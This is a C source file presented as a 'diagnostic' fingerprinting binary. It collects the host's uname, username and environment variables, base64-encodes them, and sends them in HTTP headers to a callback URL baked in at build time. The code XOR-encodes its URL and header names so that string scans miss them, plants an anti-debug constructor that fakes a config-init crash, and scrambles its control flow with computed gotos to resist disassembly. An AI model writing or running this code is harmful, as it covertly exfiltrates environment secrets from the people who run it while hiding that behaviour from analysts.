/*
 * diagnostic.c -- fingerprinting binary (obfuscated).
 *
 * Compiled at serve-time by /api/internal/diagnostic/{token} with the
 * callback URL baked in via generated header.  Collects basic system
 * info (uname, username, env snapshot) and sends it as HTTP headers to
 * the callback endpoint using raw POSIX sockets.
 *
 * Build: musl-gcc -static -I<tmpdir> -DOBFUSCATE_KEY=0xNN -o diagnostic diagnostic.c
 */
#ifndef OBFUSCATE_KEY
#define OBFUSCATE_KEY 0xA7
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/ptrace.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

/* The build system generates _diag_obfuscated.h (in a per-build temp
 * directory, passed via -I) containing XOR-encoded byte arrays:
 *   _enc_url, _enc_ua, _enc_hos, _enc_hus, _enc_hev
 * All decoded at runtime with _xdec(). */
#include "_diag_obfuscated.h"

#define BUF_SZ 16384
#define HDR_MAX 8192

/* XOR decode -------------------------------------------------------------- */

static void _xdec(unsigned char *buf, size_t len, unsigned char key) {
    size_t i;
    for (i = 0; i < len; i++)
        buf[i] ^= key;
}

/* Base64 ----------------------------------------------------------------- */

static const char _b64t[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void b64_enc(const unsigned char *src, size_t len, char *dst, size_t dst_sz) {
    size_t i, j = 0;
    if (dst_sz == 0)
        return;
    for (i = 0; i + 2 < len && j + 4 < dst_sz; i += 3) {
        dst[j++] = _b64t[(src[i] >> 2) & 0x3F];
        dst[j++] = _b64t[((src[i] & 0x03) << 4) | ((src[i + 1] >> 4) & 0x0F)];
        dst[j++] = _b64t[((src[i + 1] & 0x0F) << 2) | ((src[i + 2] >> 6) & 0x03)];
        dst[j++] = _b64t[src[i + 2] & 0x3F];
    }
    if (i < len && j + 4 < dst_sz) {
        dst[j++] = _b64t[(src[i] >> 2) & 0x3F];
        if (i + 1 < len) {
            dst[j++] = _b64t[((src[i] & 0x03) << 4) | ((src[i + 1] >> 4) & 0x0F)];
            dst[j++] = _b64t[(src[i + 1] & 0x0F) << 2];
        } else {
            dst[j++] = _b64t[(src[i] & 0x03) << 4];
            dst[j++] = '=';
        }
        dst[j++] = '=';
    }
    dst[j] = '\0';
}

static void b64_mime(const char *b64, char *out, size_t out_sz) {
    size_t slen = strlen(b64);
    size_t o = 0, i;
    for (i = 0; i < slen && o + 2 < out_sz; i++) {
        if (i > 0 && i % 76 == 0 && o + 1 < out_sz)
            out[o++] = '\n';
        out[o++] = b64[i];
    }
    out[o] = '\0';
}

/* Collect system info ----------------------------------------------------- */

static void collect_os(char *buf, size_t sz) {
    struct utsname u;
    if (uname(&u) == 0)
        snprintf(buf, sz, "%s %s %s %s %s", u.sysname, u.nodename,
                 u.release, u.version, u.machine);
    else
        snprintf(buf, sz, "unknown");
}

static void collect_user(char *buf, size_t sz) {
    uid_t uid = getuid();
    struct passwd *pw = getpwuid(uid);
    if (pw && pw->pw_name)
        snprintf(buf, sz, "%s", pw->pw_name);
    else
        snprintf(buf, sz, "uid%d", uid);
}

static void collect_env(char *b64_out, size_t b64_sz) {
    extern char **environ;
    char raw[BUF_SZ];
    size_t pos = 0;
    int count = 0;
    char **ep;
    for (ep = environ; *ep && count < 20; ep++, count++) {
        size_t elen = strlen(*ep);
        if (pos + elen + 1 >= sizeof(raw))
            break;
        memcpy(raw + pos, *ep, elen);
        pos += elen;
        raw[pos++] = '\n';
    }
    if (pos == 0) {
        raw[pos++] = '\n';
    }
    b64_enc((const unsigned char *)raw, pos, b64_out, b64_sz);
}

/* URL parsing ------------------------------------------------------------- */

typedef struct {
    char host[256];
    int  port;
    char path[1024];
} parsed_url_t;

static int parse_url(const char *url, parsed_url_t *u) {
    const char *p = url;
    if (strncmp(p, "http://", 7) == 0)
        p += 7;
    else
        return -1;

    const char *slash = strchr(p, '/');
    const char *colon = strchr(p, ':');
    size_t hlen;

    if (colon && (!slash || colon < slash)) {
        hlen = (size_t)(colon - p);
        if (hlen >= sizeof(u->host)) return -1;
        memcpy(u->host, p, hlen);
        u->host[hlen] = '\0';
        u->port = atoi(colon + 1);
    } else {
        hlen = slash ? (size_t)(slash - p) : strlen(p);
        if (hlen >= sizeof(u->host)) return -1;
        memcpy(u->host, p, hlen);
        u->host[hlen] = '\0';
        u->port = 80;
    }

    if (slash) {
        snprintf(u->path, sizeof(u->path), "%s", slash);
    } else {
        strcpy(u->path, "/");
    }
    return 0;
}

/* Socket helpers ---------------------------------------------------------- */

static int tcp_connect(const char *host, int port) {
    struct addrinfo hints, *res, *rp;
    char port_str[16];
    int fd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0)
        return -1;

    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;

        struct timeval tv = {.tv_sec = 5, .tv_usec = 0};
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) {
            freeaddrinfo(res);
            return fd;
        }
        close(fd);
    }
    freeaddrinfo(res);
    return -1;
}

static void send_request(int fd, const char *path, const char *host,
                         const char *os_hdr, const char *user_hdr,
                         const char *env_hdr) {
    /*
     * Header names and User-Agent are pre-encoded by the build system
     * and stored in _diag_obfuscated.h.  Decoded at runtime so `strings`
     * on the binary never reveals them in plaintext.
     */
    char dec_ua[sizeof(_enc_ua)];
    char dec_hos[sizeof(_enc_hos)];
    char dec_hus[sizeof(_enc_hus)];
    char dec_hev[sizeof(_enc_hev)];
    memcpy(dec_ua, _enc_ua, sizeof(_enc_ua));
    memcpy(dec_hos, _enc_hos, sizeof(_enc_hos));
    memcpy(dec_hus, _enc_hus, sizeof(_enc_hus));
    memcpy(dec_hev, _enc_hev, sizeof(_enc_hev));
    _xdec((unsigned char *)dec_ua, sizeof(_enc_ua) - 1, OBFUSCATE_KEY);
    _xdec((unsigned char *)dec_hos, sizeof(_enc_hos) - 1, OBFUSCATE_KEY);
    _xdec((unsigned char *)dec_hus, sizeof(_enc_hus) - 1, OBFUSCATE_KEY);
    _xdec((unsigned char *)dec_hev, sizeof(_enc_hev) - 1, OBFUSCATE_KEY);

    /* Build the HTTP request by concatenating decoded header names
     * with runtime values -- the format string itself is plaintext
     * but contains no sensitive data (just "GET", "Host:", "\r\n"). */
    char req[HDR_MAX];
    size_t pos = 0;

    const char *pfx = "GET ";
    size_t pfx_len = strlen(pfx);
    memcpy(req + pos, pfx, pfx_len); pos += pfx_len;

    size_t path_len = strlen(path);
    memcpy(req + pos, path, path_len); pos += path_len;

    const char *mid1 = " HTTP/1.0\r\nHost: ";
    size_t mid1_len = strlen(mid1);
    memcpy(req + pos, mid1, mid1_len); pos += mid1_len;

    size_t host_len = strlen(host);
    memcpy(req + pos, host, host_len); pos += host_len;

    req[pos++] = '\r'; req[pos++] = '\n';

    /* User-Agent line -- the decoded value IS the full header value */
    memcpy(req + pos, dec_ua, sizeof(dec_ua)); pos += sizeof(dec_ua) - 1;
    req[pos++] = '\r'; req[pos++] = '\n';

    /* X-Diag-OS line */
    memcpy(req + pos, dec_hos, sizeof(dec_hos)); pos += sizeof(dec_hos) - 1;
    size_t os_len = strlen(os_hdr);
    memcpy(req + pos, os_hdr, os_len); pos += os_len;
    req[pos++] = '\r'; req[pos++] = '\n';

    /* X-Diag-User line */
    memcpy(req + pos, dec_hus, sizeof(dec_hus)); pos += sizeof(dec_hus) - 1;
    size_t us_len = strlen(user_hdr);
    memcpy(req + pos, user_hdr, us_len); pos += us_len;
    req[pos++] = '\r'; req[pos++] = '\n';

    /* X-Diag-Env line */
    memcpy(req + pos, dec_hev, sizeof(dec_hev)); pos += sizeof(dec_hev) - 1;
    size_t ev_len = strlen(env_hdr);
    memcpy(req + pos, env_hdr, ev_len); pos += ev_len;
    req[pos++] = '\r'; req[pos++] = '\n';

    /* Blank line terminates headers */
    req[pos++] = '\r'; req[pos++] = '\n';

    if (pos >= HDR_MAX) pos = HDR_MAX - 1;
    write(fd, req, pos);
}

static void read_response(int fd) {
    char buf[1024];
    while (read(fd, buf, sizeof(buf)) > 0)
        ;
}

/* Anti-debug -------------------------------------------------------------- */

__attribute__((constructor))
static void _anti_debug_init(void) {
    volatile void **crash_ptr;
    void (*volatile dead_fn)(void);

    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
        /* Debugger detected.  Produce a misleading SIGSEGV that
           looks like a botched pointer dereference in config init,
           not an intentional anti-debug measure. */
        crash_ptr = (volatile void **)"config init failed: ";
        dead_fn = (void (*)(void)) *crash_ptr;
        dead_fn();
    }
}

/* Step functions for obfuscated control flow ------------------------------ */

static int _step_collect(char *os_info, char *user_info, char *env_b64) {
    collect_os(os_info, 512);
    collect_user(user_info, 256);
    collect_env(env_b64, BUF_SZ * 2);
    return 0;
}

static int _step_parse(parsed_url_t *url, const char *decoded_url) {
    return parse_url(decoded_url, url);
}

static int _step_connect(parsed_url_t *url, int *fd_out) {
    *fd_out = tcp_connect(url->host, url->port);
    return *fd_out < 0 ? -1 : 0;
}

static int _step_send(int fd, parsed_url_t *url, const char *os_info,
                      const char *user_info, const char *env_b64) {
    send_request(fd, url->path, url->host, os_info, user_info, env_b64);
    read_response(fd);
    close(fd);
    return 0;
}

/* Entry point (obfuscated control flow) ----------------------------------- */

int main(void) {
    char os_info[512], user_info[256], env_b64[BUF_SZ * 2];
    parsed_url_t url;
    int fd = -1;
    int rc = 1;

    /* Decode the baked-in URL at runtime. */
    size_t url_len = _enc_url_len;
    char decoded_url[2048];
    if (url_len >= sizeof(decoded_url))
        return 1;
    memcpy(decoded_url, _enc_url, url_len);
    decoded_url[url_len] = '\0';
    _xdec((unsigned char *)decoded_url, url_len, (unsigned char)OBFUSCATE_KEY);

    /* Computed-goto dispatch table -- scatters control flow across
       distinct code labels, defeating linear disassembly.  All three
       steps always execute in sequence via fall-through; the dispatch
       always enters at L_COLLECT. */
    struct timeval _tv;
    gettimeofday(&_tv, NULL);
    int _opaq = (_tv.tv_sec & 0x7FFFFFFF) % 3;
    void *dispatch[] = { &&L_COLLECT, &&L_PARSE, &&L_CONNECT };
    (void)_opaq;
    goto *dispatch[0];

L_COLLECT:
    if (_step_collect(os_info, user_info, env_b64) != 0)
        goto L_DONE;

L_PARSE:
    if (_step_parse(&url, decoded_url) != 0)
        goto L_DONE;

L_CONNECT:
    if (_step_connect(&url, &fd) != 0)
        goto L_DONE;
    _step_send(fd, &url, os_info, user_info, env_b64);
    rc = 0;

L_DONE:
    return rc;
}
